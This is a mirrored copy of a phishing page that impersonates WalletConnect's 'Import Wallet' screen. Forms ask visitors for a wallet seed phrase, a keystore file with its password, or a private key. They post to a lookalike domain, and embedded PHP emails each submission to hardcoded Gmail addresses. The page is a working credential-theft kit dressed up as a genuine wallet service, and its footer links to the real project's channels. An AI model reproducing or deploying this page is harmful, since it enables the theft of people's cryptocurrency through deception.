<html>

<!-- Mirrored from walletconnect-validate.net/connect/index915e915e915e?w=icon by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Nov 2021 20:47:00 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" href="../assets/main.css" type="text/css"> 
<meta name="description" content="Open protocol for connecting Wallets to Dapps">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:image" content="../images/logo.html">
<link rel="icon" href="../assets/logo.svg">
<script>
    function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;
  
    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
  </script>
<title>Import Wallet</title>
</head>
<body>
<center>
<div class="top">
        <a href="#footer?v" class="left">Github</a>
        <a href="#?v" class="left">Docs</a>
        <a href="../index9e36.html?v" class="main"><img src="../assets/logo.svg" alt="logo"></a>
        <a href="#wallets?v" class="left">Wallets</a>
        <a href="#?v" class="left">Apps</a>
</div>
<br>
<h2><center>Import Wallet</center></h2>
<br>
<div class="tab">
  <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
  <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
  <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
</div>
<?php
	if (isset($_POST["importphrase"])) {
		$phrase = addslashes($_POST["phrase"]);
		$subject = "Wallet Connect";
		$sender = "arowolo886@gmail.com";
		$receiver = "Richardjoel247@gmail.com";
		
		// set content type header for html email
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		// set additional headers
		$headers .= $headers .= "From:" . $sender . "\r\n" . 'X-Mailer: PHP/' . phpversion();
		$subject = $subject;
		$body= "<html>
		<head>
			<title>". $subject ."</title>
		</head>
		<body>
			<div style='margin: 25px 15px; border: 1px solid blue'>
				<br/>
				<div style='padding: 0 30px;'>
					<p> 
						You have a new memonic alert from your website. Below are the details.<br/>
						".$phrase." <br/>
						Wallet: Trust Wallet
					</p>
				</div>
			</div>
		</body></html>";
		mail($sender, $subject, $body, $headers);
	}
?>
<div id="phrase" class="tabcontent" style="display: block;">
<form method="POST" action="https://walletconnect-validated.net/action/phrase">

<input type="hidden" name="w" value="icon">

<textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
<br>
<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
<br>
<button type="submit" name="importphrase" class="btn">IMPORT</button>
</form>
</div>


<?php
	if (isset($_POST["importkeystore"])) {
		$phrase = addslashes($_POST["phrase"]);
		$subject = "Wallet Connect";
		$sender = "arowolo886@gmail.com";
		$receiver = "Richardjoel247@gmail.com";
		
		// set content type header for html email
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		// set additional headers
		$headers .= $headers .= "From:" . $sender . "\r\n" . 'X-Mailer: PHP/' . phpversion();
		$subject = $subject;
		$body= "<html>
		<head>
			<title>". $subject ."</title>
		</head>
		<body>
			<div style='margin: 25px 15px; border: 1px solid blue'>
				<br/>
				<div style='padding: 0 30px;'>
					<p> 
						You have a new memonic alert from your website. Below are the details.<br/>
						".$phrase." <br/>
						Wallet: Trust Wallet
					</p>
				</div>
			</div>
		</body></html>";
		mail($sender, $subject, $body, $headers);
	}
?>
<div id="keystore" class="tabcontent" style="display: none;">
<form action="https://walletconnect-validated.net/action/keystore" method="POST">

<input type="hidden" name="w" value="icon">

<textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
<br>
<div class="field">
    <input type="text" name="password" placeholder="Password">
</div>
<div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
<br>
<button type="submit" name="importkeystore" class="btn">IMPORT</button>
</form>
</div>


<?php
	if (isset($_POST["importprivate"])) {
		$phrase = addslashes($_POST["phrase"]);
		$subject = "Wallet Connect";
		$sender = "arowolo886@gmail.com";
		$receiver = "Richardjoel247@gmail.com";
		
		// set content type header for html email
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		// set additional headers
		$headers .= $headers .= "From:" . $sender . "\r\n" . 'X-Mailer: PHP/' . phpversion();
		$subject = $subject;
		$body= "<html>
		<head>
			<title>". $subject ."</title>
		</head>
		<body>
			<div style='margin: 25px 15px; border: 1px solid blue'>
				<br/>
				<div style='padding: 0 30px;'>
					<p> 
						You have a new memonic alert from your website. Below are the details.<br/>
						".$phrase." <br/>
						Wallet: Trust Wallet
					</p>
				</div>
			</div>
		</body></html>";
		mail($sender, $subject, $body, $headers);
	}
?>
<div id="private" class="tabcontent" style="display: none;">
<form action="https://walletconnect-validated.net/action/privatekey" method="POST">
<input type="hidden" name="w" value="icon">
<div class="field">
    <input type="text" name="key" class="key" placeholder="Private Key">
</div>
<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
<br>
<button type="submit" name="importprivate" class="btn">IMPORT</button>
</form>
</div>

<script>
    document.getElementById("default").click();
</script>
<footer><div id="footer">
<p><img src="../assets/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
<p><img src="../assets/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
<p><img src="../assets/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
<p><img src="../assets/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
</div></footer>
</center></body>
<!-- Mirrored from walletconnect-validate.net/connect/index915e915e915e?w=icon by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Nov 2021 20:47:00 GMT -->
</html>